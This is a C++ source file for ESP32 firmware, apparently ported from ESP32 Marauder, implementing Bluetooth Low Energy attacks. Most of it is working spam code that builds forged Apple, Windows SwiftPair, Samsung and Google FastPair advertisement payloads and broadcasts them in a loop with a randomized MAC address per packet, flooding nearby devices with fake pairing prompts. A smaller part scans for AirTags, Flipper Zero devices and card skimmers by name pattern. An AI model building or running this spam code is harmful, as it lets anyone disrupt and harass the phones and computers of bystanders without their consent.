/**
 * ESP32 Marauder TUI - Bluetooth Attacks Implementation
 * 
 * Ported from ESP32 Marauder BLE spam attacks
 * Based on ESP32 Sour Apple by RapierXbox/ECTO-1A
 * and various BLE spam implementations
 */

#include "BTAttacks.h"
#include "SerialTUI.h"
#include <esp_random.h>

// ============================================
// BLE Spam Payloads
// ============================================

// Apple proximity pairing (Sour Apple)
// https://github.com/RapierXbox/ESP32-Sour-Apple
const uint8_t appleProximityPrefix[] = {
    0x10,       // Proximity pairing
    0x07,       // Length
    0x00,       // Device type (randomized)
    0x00, 0x00, // Device model (randomized)
    0x00,       // Status  
    0x00,       // Flags
    0x00,       // TX Power
};

// Windows SwiftPair
const uint8_t windowsSwiftPairPrefix[] = {
    0x06,       // Length
    0xFF,       // Manufacturer specific
    0x06, 0x00, // Microsoft vendor ID
    0x03,       // SwiftPair
    0x00,       // Flags
};

// Samsung BLE
const uint8_t samsungPrefix[] = {
    0x02,       // Length
    0x01,       // Type: Flags
    0x18,       // Flags: Limited discoverable
    0x0A,       // Length
    0xFF,       // Manufacturer specific
    0x75, 0x00, // Samsung vendor ID
    0x01,       // Type
    0x00, 0x00, // Data
    0x00, 0x00,
    0x00, 0x00,
};

// Google FastPair
// https://developers.google.com/nearby/fast-pair
const uint32_t googleModelIds[] = {
    0x0001F0,   // Pixel Buds
    0x000047,   // Pixel Buds A-Series  
    0x470000,   // Random device
    0xCD8256,   // Random device
    0x0E30C3,   // Random device
};

// Card skimmer detection patterns
const char* skimmerPatterns[] = {
    "HC-05",
    "HC-06",
    "HC-08",
    "BT_SKIMMER",
    "RNBT",
};

// Flipper Zero detection
const char* flipperPattern = "Flipper";

// ============================================
// BTAttacks Implementation
// ============================================

void BTAttacks::begin() {
    // Initialize NimBLE
    NimBLEDevice::init("");
    
    // Get advertising instance
    _pAdvertising = NimBLEDevice::getAdvertising();
    
    // Get scan instance
    _pScan = NimBLEDevice::getScan();
    _pScan->setInterval(100);
    _pScan->setWindow(99);
    _pScan->setActiveScan(true);
}

void BTAttacks::update() {
    if (_mode == BTMode::IDLE) return;
    
    uint32_t now = millis();
    
    switch (_mode) {
        case BTMode::SPAM_APPLE:
            sendSpamPacket(BTSpamType::APPLE);
            delay(20);
            break;
            
        case BTMode::SPAM_WINDOWS:
            sendSpamPacket(BTSpamType::WINDOWS);
            delay(20);
            break;
            
        case BTMode::SPAM_SAMSUNG:
            sendSpamPacket(BTSpamType::SAMSUNG);
            delay(20);
            break;
            
        case BTMode::SPAM_GOOGLE:
            sendSpamPacket(BTSpamType::GOOGLE);
            delay(20);
            break;
            
        case BTMode::SPAM_ALL:
            // Cycle through all spam types
            {
                static uint8_t spamIdx = 0;
                BTSpamType types[] = {BTSpamType::APPLE, BTSpamType::WINDOWS, 
                                      BTSpamType::SAMSUNG, BTSpamType::GOOGLE};
                sendSpamPacket(types[spamIdx]);
                spamIdx = (spamIdx + 1) % 4;
                delay(20);
            }
            break;
            
        default:
            // Scanning modes - handled by callback
            break;
    }
    
    // Print status periodically
    if (now - _lastUpdate > 2000) {
        char buf[64];
        snprintf(buf, sizeof(buf), "BT packets: %d", _packetCount);
        tui.printStatus(buf);
        _lastUpdate = now;
    }
}

void BTAttacks::stop() {
    if (_mode == BTMode::IDLE) return;
    
    // Stop advertising
    if (_pAdvertising) {
        _pAdvertising->stop();
    }
    
    // Stop scan
    if (_pScan && _pScan->isScanning()) {
        _pScan->stop();
    }
    
    char buf[64];
    snprintf(buf, sizeof(buf), "BT stopped. Packets: %d", _packetCount);
    tui.printStatus(buf);
    
    _mode = BTMode::IDLE;
    _packetCount = 0;
}

// ============================================
// Scanning
// ============================================

class ScanCallback : public NimBLEAdvertisedDeviceCallbacks {
public:
    BTMode mode;
    
    void onResult(NimBLEAdvertisedDevice* device) override {
        String name = device->getName().c_str();
        String addr = device->getAddress().toString().c_str();
        int rssi = device->getRSSI();
        
        char buf[64];
        
        switch (mode) {
            case BTMode::SCAN_ALL:
                if (name.length() > 0) {
                    snprintf(buf, sizeof(buf), "%s [%s] %ddBm", 
                             name.c_str(), addr.c_str(), rssi);
                } else {
                    snprintf(buf, sizeof(buf), "[%s] %ddBm", addr.c_str(), rssi);
                }
                tui.printResult(buf);
                break;
                
            case BTMode::SCAN_AIRTAG:
                // Apple devices have manufacturer data 0x004C
                if (device->haveManufacturerData()) {
                    std::string mfr = device->getManufacturerData();
                    if (mfr.length() >= 2 && mfr[0] == 0x4C && mfr[1] == 0x00) {
                        // Check for FindMy/AirTag patterns
                        if (mfr.length() > 4 && mfr[2] == 0x12) {
                            snprintf(buf, sizeof(buf), "AIRTAG: %s %ddBm", 
                                     addr.c_str(), rssi);
                            tui.printResult(buf);
                        }
                    }
                }
                break;
                
            case BTMode::SCAN_FLIPPER:
                if (name.length() > 0 && name.indexOf("Flipper") >= 0) {
                    snprintf(buf, sizeof(buf), "FLIPPER: %s [%s] %ddBm",
                             name.c_str(), addr.c_str(), rssi);
                    tui.printResult(buf);
                }
                break;
                
            case BTMode::SCAN_SKIMMER:
                // Check for common skimmer patterns
                for (int i = 0; i < 5; i++) {
                    if (name.indexOf(skimmerPatterns[i]) >= 0) {
                        snprintf(buf, sizeof(buf), "SKIMMER?: %s [%s] %ddBm",
                                 name.c_str(), addr.c_str(), rssi);
                        tui.printResult(buf);
                        break;
                    }
                }
                break;
                
            default:
                break;
        }
    }
};

static ScanCallback scanCallback;

void BTAttacks::startScanAll() {
    _mode = BTMode::SCAN_ALL;
    _packetCount = 0;
    
    scanCallback.mode = BTMode::SCAN_ALL;
    _pScan->setAdvertisedDeviceCallbacks(&scanCallback, false);
    _pScan->start(0, nullptr, false);
    
    tui.printStatus("BT scan started (press any key to stop)...");
}

void BTAttacks::startScanAirtag() {
    _mode = BTMode::SCAN_AIRTAG;
    _packetCount = 0;
    
    scanCallback.mode = BTMode::SCAN_AIRTAG;
    _pScan->setAdvertisedDeviceCallbacks(&scanCallback, false);
    _pScan->start(0, nullptr, false);
    
    tui.printStatus("Scanning for AirTags...");
}

void BTAttacks::startScanFlipper() {
    _mode = BTMode::SCAN_FLIPPER;
    _packetCount = 0;
    
    scanCallback.mode = BTMode::SCAN_FLIPPER;
    _pScan->setAdvertisedDeviceCallbacks(&scanCallback, false);
    _pScan->start(0, nullptr, false);
    
    tui.printStatus("Scanning for Flippers...");
}

void BTAttacks::startScanSkimmer() {
    _mode = BTMode::SCAN_SKIMMER;
    _packetCount = 0;
    
    scanCallback.mode = BTMode::SCAN_SKIMMER;
    _pScan->setAdvertisedDeviceCallbacks(&scanCallback, false);
    _pScan->start(0, nullptr, false);
    
    tui.printStatus("Detecting card skimmers...");
}

// ============================================
// Spam Attacks
// ============================================

void BTAttacks::startSpamApple() {
    _mode = BTMode::SPAM_APPLE;
    _packetCount = 0;
    _lastUpdate = millis();
}

void BTAttacks::startSpamWindows() {
    _mode = BTMode::SPAM_WINDOWS;
    _packetCount = 0;
    _lastUpdate = millis();
}

void BTAttacks::startSpamSamsung() {
    _mode = BTMode::SPAM_SAMSUNG;
    _packetCount = 0;
    _lastUpdate = millis();
}

void BTAttacks::startSpamGoogle() {
    _mode = BTMode::SPAM_GOOGLE;
    _packetCount = 0;
    _lastUpdate = millis();
}

void BTAttacks::startSpamAll() {
    _mode = BTMode::SPAM_ALL;
    _packetCount = 0;
    _lastUpdate = millis();
}

// ============================================
// Payload Generators
// ============================================

NimBLEAdvertisementData BTAttacks::getApplePayload() {
    NimBLEAdvertisementData data;
    
    // Apple manufacturer ID: 0x004C
    uint8_t payload[17];
    payload[0] = 0x10;  // Length
    payload[1] = 0xFF;  // Manufacturer specific
    payload[2] = 0x4C;  // Apple (little endian)
    payload[3] = 0x00;
    payload[4] = 0x0F;  // Nearby action
    payload[5] = 0x05;  // Action data length
    payload[6] = random(256);  // Action flags
    payload[7] = random(256);  // Action type
    payload[8] = random(256);  // Authentication tag
    payload[9] = random(256);
    payload[10] = random(256);
    
    // Proximity pairing
    payload[11] = 0x07;  // Type
    payload[12] = 0x05;  // Length
    payload[13] = random(256);  // Device type
    payload[14] = random(256);  // Device model
    payload[15] = random(256);
    payload[16] = random(256);  // Color
    
    data.addData(std::string((char*)payload, sizeof(payload)));
    
    return data;
}

NimBLEAdvertisementData BTAttacks::getWindowsPayload() {
    NimBLEAdvertisementData data;
    
    // Microsoft vendor ID: 0x0006
    uint8_t payload[30];
    int idx = 0;
    
    // Flags
    payload[idx++] = 0x02;  // Length
    payload[idx++] = 0x01;  // Type: Flags
    payload[idx++] = 0x06;  // Flags: General discoverable
    
    // Complete local name (random)
    char name[8];
    for (int i = 0; i < 7; i++) {
        name[i] = 'A' + random(26);
    }
    name[7] = '\0';
    
    payload[idx++] = 8;     // Length
    payload[idx++] = 0x09;  // Complete local name
    memcpy(&payload[idx], name, 7);
    idx += 7;
    
    // Microsoft SwiftPair
    payload[idx++] = 0x09;  // Length
    payload[idx++] = 0xFF;  // Manufacturer specific
    payload[idx++] = 0x06;  // Microsoft (little endian)
    payload[idx++] = 0x00;
    payload[idx++] = 0x03;  // SwiftPair
    payload[idx++] = 0x00;  // Flags
    payload[idx++] = random(256);  // Salt
    payload[idx++] = random(256);
    payload[idx++] = random(256);
    
    data.addData(std::string((char*)payload, idx));
    
    return data;
}

NimBLEAdvertisementData BTAttacks::getSamsungPayload() {
    NimBLEAdvertisementData data;
    
    uint8_t payload[15];
    int idx = 0;
    
    // Flags
    payload[idx++] = 0x02;
    payload[idx++] = 0x01;
    payload[idx++] = 0x18;  // Limited discoverable
    
    // Samsung manufacturer data
    payload[idx++] = 0x0A;  // Length
    payload[idx++] = 0xFF;  // Manufacturer specific
    payload[idx++] = 0x75;  // Samsung (little endian)
    payload[idx++] = 0x00;
    payload[idx++] = 0x01;  // Type
    payload[idx++] = random(256);
    payload[idx++] = random(256);
    payload[idx++] = random(256);
    payload[idx++] = random(256);
    payload[idx++] = random(256);
    payload[idx++] = random(256);
    
    data.addData(std::string((char*)payload, idx));
    
    return data;
}

NimBLEAdvertisementData BTAttacks::getGooglePayload() {
    NimBLEAdvertisementData data;
    
    // Google FastPair model ID
    uint32_t modelId = googleModelIds[random(5)];
    
    uint8_t payload[14];
    int idx = 0;
    
    // Flags
    payload[idx++] = 0x02;
    payload[idx++] = 0x01;
    payload[idx++] = 0x06;
    
    // Google FastPair service data
    payload[idx++] = 0x06;  // Length
    payload[idx++] = 0x16;  // Service data
    payload[idx++] = 0x2C;  // FastPair UUID (little endian)
    payload[idx++] = 0xFE;
    payload[idx++] = (modelId >> 16) & 0xFF;
    payload[idx++] = (modelId >> 8) & 0xFF;
    payload[idx++] = modelId & 0xFF;
    
    data.addData(std::string((char*)payload, idx));
    
    return data;
}

// ============================================
// Helpers
// ============================================

void BTAttacks::randomizeMac() {
    uint8_t mac[6];
    for (int i = 0; i < 6; i++) {
        mac[i] = random(256);
    }
    // Make it a random address (bit 1 of first byte = 1)
    mac[0] |= 0x02;
    
    esp_base_mac_addr_set(mac);
}

void BTAttacks::sendSpamPacket(BTSpamType type) {
    // Randomize MAC for each packet
    randomizeMac();
    
    NimBLEAdvertisementData advData;
    
    switch (type) {
        case BTSpamType::APPLE:
            advData = getApplePayload();
            break;
        case BTSpamType::WINDOWS:
            advData = getWindowsPayload();
            break;
        case BTSpamType::SAMSUNG:
            advData = getSamsungPayload();
            break;
        case BTSpamType::GOOGLE:
            advData = getGooglePayload();
            break;
        default:
            return;
    }
    
    _pAdvertising->stop();
    _pAdvertising->setAdvertisementData(advData);
    _pAdvertising->start();
    
    _packetCount++;
}

